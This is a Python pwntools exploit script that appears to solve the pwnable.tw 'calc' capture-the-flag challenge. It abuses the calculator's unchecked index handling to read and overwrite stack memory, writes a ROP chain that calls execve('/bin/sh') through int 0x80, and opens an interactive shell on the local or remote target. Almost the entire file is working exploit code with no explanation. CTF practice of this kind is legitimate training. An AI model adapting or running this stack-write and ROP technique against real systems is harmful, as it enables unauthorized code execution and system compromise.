#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
from pwn import *


LOCALE = './files/calc'
REMOTE = ['chall.pwnable.tw', 10100]

context.binary = LOCALE
context.binary.checksec()

##########################################################
############## Parse command line arguments ##############
##########################################################
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(*REMOTE)
elif len(sys.argv) > 1 and sys.argv[1] == 'locale':
    p = process(LOCALE)
else:
    print 'Usage: %s {remote|locale} [test]' % sys.argv[0]
    sys.exit(1)

if len(sys.argv) > 2 and sys.argv[2] == 'test':
    p.interactive()
    sys.exit(0)
##########################################################

def r_mem(offset):
    p.sendline('%+d' % offset)
    return int(p.recvline())

def w_mem(offset, value):
    current = r_mem(offset)
    diff = value - current
    if diff == 0:
        return 0

    p.sendline('%+d%+d' % (offset, diff))
    assert value == int(p.recvline())


p.recvline()
rop = [0x0805c34b,  # pop eax ; ret
       0x0000000b,  # SYS_EXECVE
       0x080701d0,  # pop edx ; pop ecx ; pop ebx ; ret
       0x00000000,
       0x00000000,
       r_mem(360),  # <-- EBP
       0x08070880,  # int 80 ; ret
       0x6e69622f,  # /bin
       0x0068732f]  # /sh

with log.progress('Writing ropchain into stack') as l:
    for i, r in enumerate(rop):
        l.status('(%2d/%2d) %s' % (i + 1, len(rop), hex(r)))
        w_mem(360 + i + 1, r)
    l.success('Done')

p.sendline('')
p.interactive()
p.close()
